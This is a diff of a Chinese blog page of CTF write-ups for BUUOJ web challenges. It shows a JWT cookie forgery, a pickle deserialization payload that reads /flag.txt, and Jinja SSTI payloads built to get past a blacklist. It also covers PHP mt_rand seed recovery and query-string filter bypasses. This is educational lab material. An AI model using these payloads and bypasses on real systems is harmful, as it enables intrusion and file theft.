@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -269,13 +269,13 @@ url=<span class="hljs-string">&quot;http://6e7db183-764d-4afc-bdbb-b70791536e4a.
 <p>将上面的JWT值放到上面的网站中可以看到</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210204213818731.png" srcset="/img/loading.gif" alt="image-20210204213818731"></p>
 <p>下面要做的就是伪造JWT，将username 的值换成admin</p>
-<p>但是我们需要知道构造JWT使用的密码，使用工具（<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker）">https://github.com/brendan-rius/c-jwt-cracker）</a></p>
+<p>但是我们需要知道构造JWT使用的密码，使用工具（<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker%EF%BC%89">https://github.com/brendan-rius/c-jwt-cracker）</a></p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203224014680.png" srcset="/img/loading.gif" alt="image-20210203224014680"></p>
 <p>得到密码后就可以伪造出admin使用的cookie</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203224242635.png" srcset="/img/loading.gif" alt="image-20210203224242635"></p>
 <p>得到cookie后使用浏览器中的cookie编辑插件，将其中的JWT换成构造好的JWT，这样就是以admin身份登录</p>
 <p>在个人中心发现另外一个hint</p>
-<p>查看源码后，发现了<a target="_blank" rel="noopener" href="http://www.zip源码包">www.zip源码包</a></p>
+<p>查看源码后，发现了<a target="_blank" rel="noopener" href="http://www.zip源码包/">www.zip源码包</a></p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203225614309.png" srcset="/img/loading.gif" alt="image-20210203225614309"></p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210203230506914.png" srcset="/img/loading.gif" alt="image-20210203230506914"></p>
 <h2 id="0x3-python-反序列化"><a href="#0x3-python-反序列化" class="headerlink" title="0x3 python 反序列化"></a>0x3 python 反序列化</h2><p>在admin.py中发现了可反序列化的点</p>
@@ -291,8 +291,8 @@ pickle序列化后的数据，可读性差，人一般无法识别。
 urllib<span class="hljs-selector-class">.unquote</span>:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式
 pickle<span class="hljs-selector-class">.loads</span>(bytes_object): 从字节对象中读取被封装的对象，并返回</code></pre></div>
 
-<p>首先构建一个类，类里面的<em>\</em>reduce__python魔术方法会在该类被反序列化的时候会被调用</p>
-<p>在<em>\</em>reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</p>
+<p>首先构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用</p>
+<p>在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</p>
 <div class="hljs"><pre><code class="hljs livecodeserver">Pickle模块中最常用的函数为：
 
 （<span class="hljs-number">1</span>）pickle.dump(obj, <span class="hljs-built_in">file</span>, [,protocol])
@@ -336,17 +336,17 @@ pickle<span class="hljs-selector-class">.loads</span>(bytes_object): 从字节�
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle
 <span class="hljs-keyword">import</span> urllib
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))
 
 a = pickle.dumps(payload())
 a = urllib.quote(a)
-print(a)</code></pre></div>
+<span class="hljs-built_in">print</span>(a)</code></pre></div>
 
 <p>将得到的内容提交给become参数</p>
 <p>连接为</p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://a<span class="hljs-number">12</span>f<span class="hljs-number">4</span>ef<span class="hljs-number">4</span>-c<span class="hljs-number">68</span>f-<span class="hljs-number">40</span>c<span class="hljs-number">7</span>-afa<span class="hljs-number">3</span>-<span class="hljs-number">09358</span>de<span class="hljs-number">17</span>dbf.node<span class="hljs-number">3</span>.buuoj.cn/b<span class="hljs-number">1</span>g_m<span class="hljs-number">4</span>mber</code></pre></div>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://a12f4ef4-c68f-<span class="hljs-number">40</span>c7-afa3-<span class="hljs-number">09358</span>de17dbf.node3.buuoj.cn/b1g_m4mber</code></pre></div>
 
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210204211046648.png" srcset="/img/loading.gif" alt="image-20210204211046648"></p>
 <p> 参考</p>
@@ -394,8 +394,8 @@ t = <span class="hljs-string">&quot;&quot;</span>
         mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
     <span class="hljs-comment"># print(mid)</span>
     flag = flag + <span class="hljs-built_in">chr</span>(mid)
-    print(flag)
-print(flag)
+    <span class="hljs-built_in">print</span>(flag)
+<span class="hljs-built_in">print</span>(flag)
 </code></pre></div>
 
 
@@ -406,20 +406,20 @@ print(flag)
 <p>访问后看到了题目源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span>
-header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);
-session_start();
+<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);
+<span class="hljs-title function_ invoke__">session_start</span>();
 <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;
-<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=rand(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);
+<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);
 &#125;
 
-mt_srand(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);
+<span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);
 <span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;
 <span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;
 <span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;
 <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;
-    <span class="hljs-variable">$str</span>.=substr(<span class="hljs-variable">$str_long1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       
+    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       
 &#125;
-<span class="hljs-variable">$str_show</span> = substr(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);
+<span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;
 
 
@@ -431,7 +431,7 @@ mt_srand(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;
     &#125;
 &#125;
-show_source(<span class="hljs-string">&quot;check.php&quot;</span>);</code></pre></div>
+<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>);</code></pre></div>
 
 <p>可以看到seed是伪随机生成的，网上搜了一下存在很多这样的文章（<a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/03/16/PHP%E4%B8%ADmt-rand%E5%87%BD%E6%95%B0%E4%BA%A7%E7%94%9F%E7%9A%84%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/">这里</a>）</p>
 <p>先将伪随机数转换为php_mt_seed可以识别的数据</p>
@@ -445,7 +445,7 @@ res=<span class="hljs-string">&#x27;&#x27;</span>
         <span class="hljs-keyword">if</span> str2[i] == str1[j]:
             res+=<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str1)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27; &#x27;</span>
             <span class="hljs-keyword">break</span>
-print(res)</code></pre></div>
+<span class="hljs-built_in">print</span>(res)</code></pre></div>
 
 
 
@@ -454,13 +454,13 @@ print(res)</code></pre></div>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205213824123.png" srcset="/img/loading.gif" alt="image-20210205213824123"></p>
 <p>再使用题目中的源码生成完整的字符串</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-mt_srand(<span class="hljs-number">93047411</span>);
+<span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">93047411</span>);
 
 <span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;
 <span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;
 <span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;
 <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;
-    <span class="hljs-variable">$str</span>.=substr(<span class="hljs-variable">$str_long1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       
+    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       
 &#125;
 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;
 
@@ -480,12 +480,12 @@ mt_srand(<span class="hljs-number">93047411</span>);
 <p>但是base64解密的页面解密错误格式的字符串出现报错，从而暴露出部分源码</p>
 <h2 id="0x1查看代码"><a href="#0x1查看代码" class="headerlink" title="0x1查看代码"></a>0x1查看代码</h2><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205220338459.png" srcset="/img/loading.gif" alt="image-20210205220338459"></p>
 <p>首先获取我们输入的内容，之后进行base64解码，解码后通过waf检测则被执行，所以存在SSTI注入</p>
-<h2 id="0x2-读取源码"><a href="#0x2-读取源码" class="headerlink" title="0x2 读取源码"></a>0x2 读取源码</h2><div class="hljs"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;app.py&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></div>
+<h2 id="0x2-读取源码"><a href="#0x2-读取源码" class="headerlink" title="0x2 读取源码"></a>0x2 读取源码</h2><div class="hljs"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span></code></pre></div>
 
 
 
 <p>将上面的代码进行base64编码后提交解码，便可得到题目的源码，其中waf代码如下</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span> 
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>): 
 black_list = [&amp;<span class="hljs-comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] </span>
 <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list : 
 	<span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower() : 
@@ -494,18 +494,18 @@ black_list = [&amp;<span class="hljs-comment">#34;flag&amp;#34;,&amp;#34;os&amp;
 
 
 <h2 id="0x3-读取flag"><a href="#0x3-读取flag" class="headerlink" title="0x3 读取flag"></a>0x3 读取flag</h2><p>首先列出目录</p>
-<div class="hljs"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="hljs-name">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span>
-
-<span class="xml">#IHt7JycuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzc1XS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJyl9fQ==</span>
-</code></pre></div>
+<div class="hljs"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="hljs-name">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span>
+<span class="language-xml"></span>
+<span class="language-xml">#IHt7JycuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzc1XS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJyl9fQ==</span>
+<span class="language-xml"></span></code></pre></div>
 
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210205222852159.png" srcset="/img/loading.gif" alt="image-20210205222852159"></p>
 <p>读取文件</p>
 <p>使用python自带的切片省去了绕过flag的步骤</p>
-<div class="hljs"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;txt.galf_eht_si_siht/&#x27;[::-1],&#x27;r&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span>
-
-<span class="xml">#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span>
-</code></pre></div>
+<div class="hljs"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-<span class="hljs-number">1</span>],<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span>
+<span class="language-xml"></span>
+<span class="language-xml">#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span>
+<span class="language-xml"></span></code></pre></div>
 
 
 
@@ -519,39 +519,39 @@ black_list = [&amp;<span class="hljs-comment">#34;flag&amp;#34;,&amp;#34;os&amp;
 <div class="hljs"><pre><code class="hljs autoit">$query = $_SERVER[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]<span class="hljs-comment">;</span></code></pre></div>
 
 <p>上网查看一下</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207201749802.png" srcset="/img/loading.gif" alt></p>
-<p>上面的代码的意思就是上传的参数中不能包括 <code>_, %5f</code>    </p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207201749802.png" srcset="/img/loading.gif"></p>
+<p>上面的代码的意思就是上传的参数中不能包括 <code>_, %5f</code>	</p>
 <p>但是可以使用 <code>%5F</code>，绕过</p>
 <p>第二个if语句通过get取得的参数b_u_p_t不等于23333但是正则，匹配需要匹配到23333所以这里用%0a(因为正则匹配中’^’和’$’代表的是行的开头和结尾,所以能利用换行绕过)绕过</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207201422848.png" srcset="/img/loading.gif" alt="image-20210207201422848"></p>
 <h2 id="0x2-第二关"><a href="#0x2-第二关" class="headerlink" title="0x2 第二关"></a>0x2 第二关</h2><p>访问上面的路劲，看到了js代码，放在控制台中运行，提示要POST Mrak</p>
 <p>随便post数据即可获取源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
-error_reporting(<span class="hljs-number">0</span>); 
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); 
 <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;
-ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); 
+<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); 
 <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
 
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; 
-    highlight_file(<span class="hljs-keyword">__FILE__</span>); 
+    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); 
     <span class="hljs-keyword">die</span>(); 
 &#125; 
 
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; 
-    <span class="hljs-variable">$v</span> = base64_decode(<span class="hljs-variable">$v</span>); 
+    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); 
     <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; 
-    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; 
-        <span class="hljs-variable">$re</span> .= chr ( ord (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); 
+    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; 
+        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); 
     &#125; 
     <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; 
 &#125;
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;
-<span class="hljs-variable">$ip</span> = getIp();
+<span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();
 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;
-<span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);
-<span class="hljs-keyword">echo</span> file_get_contents(change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 
@@ -568,10 +568,10 @@ ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="h
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-variable">$v</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;
 <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; 
-<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; 
-    <span class="hljs-variable">$re</span> .= chr ( ord (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); 
+<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; 
+    <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); 
 &#125; 
-<span class="hljs-keyword">print</span> base64_encode(<span class="hljs-variable">$re</span>);
+<span class="hljs-keyword">print</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$re</span>);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 
@@ -579,18 +579,18 @@ ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="h
 <p>payload如图</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207211654779.png" srcset="/img/loading.gif" alt="image-20210207211654779"></p>
 <h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;
   <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];
-  <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;
+  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;
     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);
   &#125;
